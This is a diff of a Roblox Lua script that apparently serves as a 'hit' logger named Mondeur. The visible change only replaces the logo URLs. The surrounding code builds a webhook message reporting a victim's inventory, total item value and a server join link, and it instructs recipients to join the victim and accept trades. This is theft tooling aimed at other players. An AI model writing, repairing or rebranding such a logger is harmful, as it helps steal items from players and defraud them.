@@ -307,7 +307,7 @@ local JoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .
     local payload = {
         content = (totalValue >= 20 and "> @everyone " or "> ").."**".. (totalValue >= 50 and "AMAZING" or (totalValue >= 5 and "DECENT" or "SMALL")) .." HIT • Value: "..string.format("%.2f", totalValue).."**",
         username = "Mondeur Hit",
-        avatar_url = "https://rayzhubb.vercel.app/pngs/logo.png",
+        avatar_url = "https://i.postimg.cc/prcqv2x7/Mondeur-Logo.png",
         embeds = {{
             title = "MONDEUR",
             description = "<:MONDEUR🃏> **How to Use?**\nJoin the user then jump/chat and accept trades.",
@@ -319,7 +319,7 @@ local JoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .
                 { name = "<🎒> Inventory ("..petCount.." pets)", value = "```"..( #previewLines > 0 and table.concat(previewLines, "\n") or "Empty" ).."```", inline = false },
                 { name = "🚀 Join Server", value = "**[🎮 Join here](" .. JoinLink .. ")**", inline = false },
             },
-            footer = { text = "Mondeur • Total Value: "..string.format("%.2f", totalValue), icon_url = "https://rayzhubb.vercel.app/pngs/logo.png" },
+            footer = { text = "Mondeur • Total Value: "..string.format("%.2f", totalValue), icon_url = "https://i.postimg.cc/prcqv2x7/Mondeur-Logo.png" },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         }}
     }
